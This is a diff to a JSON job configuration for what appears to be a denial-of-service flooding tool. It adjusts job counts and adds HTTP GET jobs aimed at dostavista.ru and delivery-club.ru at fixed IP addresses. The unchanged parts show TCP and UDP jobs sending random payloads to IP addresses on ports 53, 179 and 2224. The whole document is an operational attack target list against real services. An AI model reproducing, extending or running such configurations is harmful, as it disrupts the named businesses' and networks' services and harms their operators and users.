@@ -1,7 +1,7 @@
 {
   "jobs": [{
       "type": "http",
-      "count": 47,
+      "count": 45,
       "args": {
         "request": {
           "method": "GET",
@@ -16,7 +16,7 @@
       }
     }, {
       "type": "http",
-      "count": 47,
+      "count": 45,
       "args": {
         "request": {
           "method": "GET",
@@ -31,7 +31,7 @@
       }
     }, {
       "type": "http",
-      "count": 47,
+      "count": 45,
       "args": {
         "request": {
           "method": "GET",
@@ -46,7 +46,7 @@
       }
     }, {
       "type": "http",
-      "count": 47,
+      "count": 45,
       "args": {
         "request": {
           "method": "GET",
@@ -61,7 +61,7 @@
       }
     }, {
       "type": "http",
-      "count": 47,
+      "count": 45,
       "args": {
         "request": {
           "method": "GET",
@@ -76,7 +76,7 @@
       }
     }, {
       "type": "http",
-      "count": 47,
+      "count": 45,
       "args": {
         "request": {
           "method": "GET",
@@ -91,7 +91,7 @@
       }
     }, {
       "type": "http",
-      "count": 47,
+      "count": 45,
       "args": {
         "request": {
           "method": "GET",
@@ -106,7 +106,7 @@
       }
     }, {
       "type": "http",
-      "count": 47,
+      "count": 45,
       "args": {
         "request": {
           "method": "GET",
@@ -121,7 +121,7 @@
       }
     }, {
       "type": "http",
-      "count": 47,
+      "count": 45,
       "args": {
         "request": {
           "method": "GET",
@@ -136,7 +136,7 @@
       }
     }, {
       "type": "http",
-      "count": 47,
+      "count": 45,
       "args": {
         "request": {
           "method": "GET",
@@ -151,7 +151,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 47,
+      "count": 45,
       "args": {
         "address": "195.189.222.1:53",
         "body": "{{ random_payload 10 }}",
@@ -159,7 +159,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 47,
+      "count": 45,
       "args": {
         "address": "195.189.222.1:179",
         "body": "{{ random_payload 10 }}",
@@ -167,7 +167,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 47,
+      "count": 45,
       "args": {
         "address": "195.189.222.1:2224",
         "body": "{{ random_payload 10 }}",
@@ -176,7 +176,7 @@
     }, {
       "type": "udp",
       "filter": "{{ (.Value (ctx_key \"global\")).EnablePrimitiveJobs }}",
-      "count": 47,
+      "count": 45,
       "args": {
         "address": "195.189.222.1:53",
         "body": "{{ random_payload 10 }}",
@@ -184,7 +184,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 47,
+      "count": 45,
       "args": {
         "address": "195.189.222.19:53",
         "body": "{{ random_payload 10 }}",
@@ -192,7 +192,7 @@
       }
     }, {
       "type": "tcp",
-      "count": 47,
+      "count": 45,
       "args": {
         "address": "195.189.222.19:179",
         "body": "{{ random_payload 10 }}",
@@ -201,11 +201,71 @@
     }, {
       "type": "udp",
       "filter": "{{ (.Value (ctx_key \"global\")).EnablePrimitiveJobs }}",
-      "count": 47,
+      "count": 45,
       "args": {
         "address": "195.189.222.19:53",
         "body": "{{ random_payload 10 }}",
         "interval_ms": 1000
+      }
+    }, {
+      "type": "http",
+      "count": 45,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://dostavista.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.71.67.112:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 45,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://dostavista.ru"
+        },
+        "client": {
+          "static_host": {
+            "addr": "185.71.67.112:443",
+            "is_tls": "true"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 45,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "http://www.delivery-club.ru/moscow"
+        },
+        "client": {
+          "static_host": {
+            "addr": "5.61.236.230:80",
+            "is_tls": "false"
+          }
+        }
+      }
+    }, {
+      "type": "http",
+      "count": 45,
+      "args": {
+        "request": {
+          "method": "GET",
+          "path": "https://www.delivery-club.ru/moscow"
+        },
+        "client": {
+          "static_host": {
+            "addr": "5.61.236.230:443",
+            "is_tls": "true"
+          }
+        }
       }
     }
   ]
